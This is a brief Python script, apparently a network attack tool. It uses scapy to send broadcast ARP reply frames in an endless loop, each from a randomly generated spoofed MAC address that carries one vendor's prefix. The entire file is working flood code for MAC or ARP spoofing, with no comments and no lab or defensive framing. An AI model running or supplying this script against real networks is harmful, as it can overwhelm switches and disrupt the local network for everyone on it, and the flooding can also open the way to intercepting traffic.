from scapy.all import *

def send_arp_packets():
    vendor = "b8:e8:56:"
    destMAC = "FF:FF:FF:FF:FF:FF"

    try:
        while True:
            randMAC = vendor + ':'.join(RandMAC().split(':')[3:])
            print(randMAC)
            packet = Ether(src=randMAC, dst=destMAC) / ARP(op=2, psrc="0.0.0.0", hwdst=destMAC) / Padding(load="X" * 18)
            sendp(packet, verbose=0)
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt: Stopping the script...")

send_arp_packets()
